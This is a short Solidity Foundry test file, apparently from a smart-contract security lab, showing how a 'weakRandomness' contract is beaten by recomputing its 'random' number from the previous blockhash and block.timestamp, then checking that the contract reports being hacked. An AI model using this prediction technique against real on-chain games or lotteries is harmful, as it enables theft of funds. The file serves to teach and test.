// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../../src/Weak Randomness/WeakRandomness.sol";

contract weakRandomnssTest is Test {
    weakRandomness weak;

    function setUp() public {
        weak = new weakRandomness();
    }

    function testWeakRandomness() public {
        uint256 GuessNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 100;
        weak.random(GuessNumber);
        require(weak.isHacked() == true, "Weak randomness is not working as expected");
    }
}
